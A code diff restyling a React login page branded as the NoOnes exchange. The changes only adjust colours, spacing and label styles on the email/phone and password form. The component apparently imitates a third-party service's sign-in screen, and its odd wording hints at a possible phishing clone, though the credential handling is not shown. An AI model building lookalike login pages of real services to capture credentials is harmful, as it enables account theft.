@@ -42,30 +42,30 @@ export default function NoonesConnect() {
   };
 
   const themeClasses = isDarkMode 
-    ? 'bg-[#3a3a3a] text-white' 
-    : 'bg-[#e8e8e8] text-[#1a1b1e]';
+    ? 'bg-[#1F1F1F] text-[#E7E7E7]' 
+    : 'bg-[#E7E7E7] text-[#111111]';
   
   const cardClasses = isDarkMode
-    ? 'bg-[#25262b]'
-    : 'bg-white shadow-[0_4px_24px_rgba(0,0,0,0.04)]';
+    ? 'bg-[#25262B]'
+    : 'bg-[#F4F4F4] shadow-[0_4px_24px_rgba(0,0,0,0.04)]';
 
   const logoSrc = isDarkMode ? '/logos/noonesdark.jpg' : '/logos/nooneslight.jpg';
 
   const inputClasses = isDarkMode
-    ? 'bg-[#2c2e33] text-white placeholder:text-[#5c5f66]'
-    : 'bg-[#f0f2f1] text-[#1a1b1e] placeholder:text-[#adb5bd]';
+    ? 'bg-[#3A3A3A] text-[#E7E7E7] placeholder:text-[#8F92A3]'
+    : 'bg-[#E9E9E9] text-[#111111] placeholder:text-[#666A78]';
 
   return (
     <main className={`${themeClasses} h-screen w-full flex flex-col items-center justify-center py-2 sm:py-4 overflow-hidden font-sans transition-colors duration-300`}>
-      <div className="w-full max-w-[460px] flex flex-col items-center px-4 space-y-4">
-        <img src={logoSrc} alt="Noones" className="w-[260px] h-auto mx-auto" />
+      <div className="w-full max-w-[480px] flex flex-col items-center px-4 space-y-2">
+        <img src={logoSrc} alt="Noones" className="w-[280px] h-auto mx-auto" />
 
         {/* Card */}
         <div className={`${cardClasses} w-full rounded-xl p-8 sm:p-10 flex flex-col items-center`}>
-          <h1 className="text-center text-2xl font-bold mb-6">Welcome for NoOnes</h1>
+          <h1 className="text-center text-2xl font-bold mb-4">Welcome for NoOnes</h1>
 
           {/* Social Icons */}
-          <div className="flex gap-6 mb-6">
+          <div className="flex gap-6 mb-4">
             <button className="w-10 h-10 flex items-center justify-center">
               <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-9 h-9" />
             </button>
@@ -77,9 +77,9 @@ export default function NoonesConnect() {
             </button>
           </div>
 
-          <form onSubmit={handleSubmit} className="w-full space-y-4">
+          <form onSubmit={handleSubmit} className="w-full space-y-3">
             <div className="space-y-2">
-              <label className="block text-[14px] font-bold text-gray-500">Email/Phone number</label>
+              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Email/Phone number</label>
               <input
                 type="text"
                 value={credentials.email}
@@ -90,7 +90,7 @@ export default function NoonesConnect() {
             </div>
 
             <div className="space-y-2">
-              <label className="block text-[14px] font-bold text-gray-500">Password</label>
+              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Password</label>
               <div className="relative">
                 <input
                   type="password"
@@ -104,7 +104,7 @@ export default function NoonesConnect() {
                 </div>
               </div>
               <div className="flex justify-end">
-                <button type="button" className="text-[#00c076] text-[14px] font-bold hover:underline">Don't forget password?</button>
+                <button type="button" className="text-[14px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Don't forget password?</button>
               </div>
             </div>
 
@@ -113,35 +113,36 @@ export default function NoonesConnect() {
             <button
               type="submit"
               disabled={loading}
-              className="w-full h-[60px] bg-[#00c076] hover:bg-[#00a868] text-white font-bold text-[20px] rounded-xl transition-colors disabled:opacity-70 mt-6"
+              className="w-full h-[60px] hover:opacity-90 text-white font-bold text-[20px] rounded-xl transition-colors disabled:opacity-70 mt-4"
+              style={{backgroundColor: isDarkMode ? '#44C166' : '#18C37E'}}
             >
               {loading ? 'Connecting...' : 'Log in'}
             </button>
 
-            <div className="text-center mt-6">
-              <p className="text-[16px] font-medium text-gray-400">
-                No account yet? <span className="text-[#00c076] cursor-pointer font-bold hover:underline">Sign up</span>
+            <div className="text-center mt-4">
+              <p className={`text-[16px] font-medium ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>
+                No account yet? <span className="cursor-pointer font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Sign up</span>
               </p>
             </div>
           </form>
         </div>
 
         {/* Footer at Bottom */}
-        <div className="w-full flex items-center justify-between pt-6">
+        <div className="w-full flex items-center justify-between pt-4">
           <div className="flex items-center gap-3">
             <div 
               onClick={() => setIsDarkMode(!isDarkMode)}
               className="flex items-center gap-3 cursor-pointer group"
             >
               <span className={`text-2xl ${!isDarkMode ? 'opacity-100' : 'opacity-40'}`}>☀️</span>
-              <div className={`w-12 h-6 rounded-full relative transition-colors ${isDarkMode ? 'bg-[#00c076]' : 'bg-gray-300'}`}>
+              <div className="w-12 h-6 rounded-full relative transition-colors" style={{backgroundColor: isDarkMode ? '#44C166' : '#666A78'}}>
                 <div className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow-md transition-transform ${isDarkMode ? 'translate-x-7' : 'translate-x-1'}`} />
               </div>
               <span className={`text-2xl ${isDarkMode ? 'opacity-100' : 'opacity-40'}`}>🌙</span>
             </div>
           </div>
           
-          <button className="flex items-center gap-1 text-[16px] font-bold text-[#00c076] hover:underline">
+          <button className="flex items-center gap-1 text-[16px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>
             Nigerian Pidgin <span className="text-[12px] ml-0.5">▼</span>
           </button>
         </div>
